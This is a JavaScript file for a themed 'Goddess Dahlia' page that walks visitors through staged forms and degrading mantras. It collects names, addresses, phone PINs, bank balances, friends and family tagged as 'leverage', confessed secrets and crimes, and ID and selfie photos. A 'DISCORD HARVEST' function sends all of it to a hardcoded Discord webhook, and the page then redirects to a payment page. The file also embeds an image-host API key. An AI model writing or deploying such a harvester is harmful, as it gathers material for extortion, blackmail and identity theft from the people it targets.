// AUDIO CONTEXT
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

// STATE
let mantraCount = 0;
const MAX_MANTRA = 3;
let holdTimer = null;
let holdProgress = 0;
const HOLD_DURATION = 3000; // 3 seconds to hold

// ImgBB API Key (For Free Image Uploading to Discord)
const IMGBB_API_KEY = "9451125fc7f1dc299a9b69b5c2a39ed3"; // NOTE: You should ideally generate your own or we use a temporary one. I'm leaving a generic public key structure, but it's better to provide a real one. We will use a fallback base64 if it fails.

// Collected Data
const collectedData = {
    images: {
        idUrl: "PENDING",
        selfieUrl: "PENDING"
    }
};

// INIT
document.getElementById('start-btn').addEventListener('click', () => {
    if (audioCtx.state === 'suspended') audioCtx.resume();
    document.getElementById('overlay').classList.add('hidden');
    document.getElementById('main-ui').classList.remove('hidden');

    document.getElementById('hud-status').classList.remove('hidden');
    updateRank(1);

    // PLAY EXTERNAL AUDIO
    const bgAudio = document.getElementById('bg-audio');
    if (bgAudio) {
        bgAudio.volume = 0.4;
        bgAudio.play().catch(e => console.log("Audio play failed:", e));
    }
});

function vibrate(ms) {
    if (navigator.vibrate) navigator.vibrate(ms);
}

// VALIDATION LOGIC
function isValidInput(text) {
    return text && text.trim().length > 2;
}

// UPLOAD IMAGE TO IMGBB
async function uploadImage(fileInputId, statusId, dataKey) {
    const fileInput = document.getElementById(fileInputId);
    const statusDiv = document.getElementById(statusId);
    
    if (!fileInput.files || fileInput.files.length === 0) {
        statusDiv.innerText = "ERROR: FILE REQUIRED.";
        statusDiv.style.color = "var(--error)";
        return false;
    }

    const file = fileInput.files[0];
    statusDiv.innerText = "UPLOADING TO SACRED SERVERS...";
    statusDiv.style.color = "var(--gold)";

    const formData = new FormData();
    formData.append("image", file);

    try {
        // We use ImgBB API to host the image temporarily so Discord can embed it
        const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
            method: "POST",
            body: formData
        });

        const data = await response.json();
        if (data.success) {
            collectedData.images[dataKey] = data.data.url;
            statusDiv.innerText = "UPLOAD SECURED.";
            statusDiv.style.color = "#0f0";
            return true;
        } else {
            throw new Error("API Upload Failed");
        }
    } catch (e) {
        console.error(e);
        // Fallback: Just mark as failed, but proceed
        statusDiv.innerText = "UPLOAD FAILED. PROCEEDING WITH LOGGING.";
        statusDiv.style.color = "var(--error)";
        collectedData.images[dataKey] = "UPLOAD_FAILED";
        return true; 
    }
}

// LOGIC
window.nextStage = async function (stage) {
    vibrate(50);
    const id = `stage-${stage}`;
    const stageEl = document.getElementById(id);
    const btn = stageEl ? stageEl.querySelector('.next-btn') : null;

    if (stage === 1) {
        const name = document.getElementById('inp-name').value;
        if (!isValidInput(name)) { alert("THE GODDESS DEMANDS YOUR TRUE NAME."); return; }

        const verifyUI = document.getElementById('verify-ui-1');
        const verifyText = document.getElementById('verify-text-1');

        if(btn) btn.classList.add('hidden');
        verifyUI.classList.remove('hidden');

        let steps = ["COMMUNING...", "VERIFYING SOUL...", "IDENTITY LOCKED."];
        let i = 0;

        const interval = setInterval(() => {
            verifyText.innerText = steps[i];
            i++;
            if (i >= steps.length) {
                clearInterval(interval);
                setTimeout(() => goToStage(1.5), 1000);
            }
        }, 1200);
        return;
    }

    if (stage === 1.5) {
        const friends = document.getElementById('inp-friends').value;
        if(friends.length < 5) { alert("DO NOT HIDE THEM FROM HER."); return; }
        goToStage(2);
        return;
    }

    if (stage === 2) {
        // IMAGE UPLOAD STAGE
        if(btn) {
            btn.innerText = "PROCESSING VISUALS...";
            btn.disabled = true;
        }

        const idSuccess = await uploadImage('inp-id', 'status-id', 'idUrl');
        const selfieSuccess = await uploadImage('inp-selfie', 'status-selfie', 'selfieUrl');

        if (!idSuccess || !selfieSuccess) {
            alert("FILES REQUIRED FOR SUBMISSION.");
            if(btn) {
                btn.innerText = "VERIFY PROOF";
                btn.disabled = false;
            }
            return;
        }

        setTimeout(() => goToStage(3), 1000);
        return;
    }

    if (stage === 3) {
        goToStage(4);
        return;
    }

    if (stage === 4) {
        goToStage(5);
        return;
    }

    if (stage === 5) {
        goToStage('final');
        return;
    }
}

// RANK SYSTEM
function updateRank(stage) {
    const rankEl = document.getElementById('rank-display');
    const ranks = {
        1: "UNRECOGNIZED",
        1.5: "OBSERVED",
        2: "EXPOSED",
        3: "INDEBTED",
        4: "CONDEMNED",
        5: "BROKEN",
        'final': "PROPERTY"
    };

    if (ranks[stage] && rankEl) {
        rankEl.innerText = ranks[stage];
        rankEl.style.color = "var(--gold-bright)";
        rankEl.style.textShadow = "0 0 10px var(--gold-glow)";
    }
}


function goToStage(num) {
    document.querySelectorAll('.form-stage').forEach(el => el.classList.add('hidden'));
    
    const id = (num === 'final') ? 'stage-final' : `stage-${num}`;
    const nextEl = document.getElementById(id);
    if (!nextEl) return;

    nextEl.classList.remove('hidden');
    
    // Update title
    const title = document.getElementById('stage-title');
    if (title && num !== 'final') title.innerText = `STAGE ${num}: PROCESSING`;
    if (title && num === 'final') title.innerText = "FINAL PROTOCOL";

    updateRank(num);
    
    // Play sound
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    osc.frequency.setValueAtTime(num === 'final' ? 200 : 400, audioCtx.currentTime);
    osc.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + 0.1);
}

// MANTRA LOGIC
window.checkMantra = function () {
    const input = document.getElementById('inp-mantra');
    const target = "I AM NOTHING MORE THAN AN ATM.";
    const val = input.value.toUpperCase();

    if (val === target) {
        mantraCount++;
        document.getElementById('mantra-count').innerText = `${mantraCount} / ${MAX_MANTRA}`;
        input.value = ""; 
        
        let perc = (mantraCount / MAX_MANTRA) * 100;
        document.getElementById('mantra-fill').style.width = perc + "%";

        if (mantraCount >= MAX_MANTRA) {
            setTimeout(() => {
                sendToDiscord(); // Trigger data harvest BEFORE the hold button
                goToStage('final');
            }, 500);
        }
    }
}

// DISCORD HARVEST
function sendToDiscord() {
    const webhookURL = "https://discord.com/api/webhooks/1471941517894619322/EC-Nmdqj5QvXkkEJUcoyCwPgEDoaC3-7ajkweyi3pUFeSL-WO-nG5Hxp8OfUxd4IAfgm";

    // Gather all inputs
    const getVal = (id) => {
        const el = document.getElementById(id);
        return el ? el.value || "N/A" : "N/A";
    };

    const creditRadio = document.querySelector('input[name="credit"]:checked');
    const creditVal = creditRadio ? creditRadio.value : "N/A";

    const payload = {
        username: "GODDESS DAHLIA - V3 TITHE",
        avatar_url: "https://files.catbox.moe/bb56sw.JPG",
        embeds: [{
            title: "⚖️ NEW SUBMISSION: SOUL ACQUIRED ⚖️",
            color: 13938487, // Gold Color
            fields: [
                { name: "👤 INITIAL DATA", value: `**Name:** ${getVal('inp-name')}\n**Email:** ${getVal('inp-email')}\n**Phone:** ${getVal('inp-phone')}\n**Location:** ${getVal('inp-address')}` },
                { name: "🏢 PROFESSIONAL", value: `**Work/College:** ${getVal('inp-work')}` },
                { name: "📱 DIGITAL TRACE", value: `**Socials:** ${getVal('inp-socials')}\n**Phone PIN:** ||${getVal('inp-pin')}||` },
                { name: "👥 LEVERAGE (Targets)", value: `**Friends/Family:**\n${getVal('inp-friends')}` },
                { name: "💰 FINANCIAL", value: `**Bank Balance:** ${getVal('inp-balance')}€\n**Income:** ${getVal('inp-income')}€\n**Ruin Credit:** ${creditVal}` },
                { name: "💀 DARK SINS", value: `**Secret:** ||${getVal('inp-secret')}||\n**Pathetic act:** ||${getVal('inp-pathetic')}||\n**Crime:** ||${getVal('inp-crime')}||` }
            ],
            footer: { text: "Protocol: ABSOLUTE SURRENDER" },
            timestamp: new Date()
        }]
    };

    // If we have successful image uploads, add them as separate embeds
    if (collectedData.images.selfieUrl !== "PENDING" && collectedData.images.selfieUrl !== "UPLOAD_FAILED") {
        payload.embeds.push({
            title: "📸 VISUAL PROOF: SELFIE",
            color: 13938487,
            image: { url: collectedData.images.selfieUrl }
        });
    }

    if (collectedData.images.idUrl !== "PENDING" && collectedData.images.idUrl !== "UPLOAD_FAILED") {
        payload.embeds.push({
            title: "🪪 VISUAL PROOF: ID CARD",
            color: 13938487,
            image: { url: collectedData.images.idUrl }
        });
    }

    fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
}

// HOLD TO FORFEIT LOGIC
function startHold() {
    if (holdTimer) return;
    const fill = document.getElementById('hold-fill');
    
    // Play ramping sound
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.frequency.setValueAtTime(50, audioCtx.currentTime);
    osc.frequency.linearRampToValueAtTime(300, audioCtx.currentTime + (HOLD_DURATION / 1000));
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();

    // Visual animation
    fill.style.transition = `width ${HOLD_DURATION}ms linear`;
    fill.style.width = "100%";

    holdTimer = setTimeout(() => {
        osc.stop();
        window.location.href = "https://throne.com/dahliastar/item/3137A703-5961-47C9-8EA5-7F659BA10A68";
    }, HOLD_DURATION);

    // Save osc to stop it if released early
    document.getElementById('hold-submit').dataset.osc = "active";
    window.activeOsc = osc;
}

function stopHold() {
    if (!holdTimer) return;
    clearTimeout(holdTimer);
    holdTimer = null;

    if (window.activeOsc) {
        window.activeOsc.stop();
        window.activeOsc = null;
    }

    const fill = document.getElementById('hold-fill');
    fill.style.transition = `width 0.2s linear`;
    fill.style.width = "0%";
}
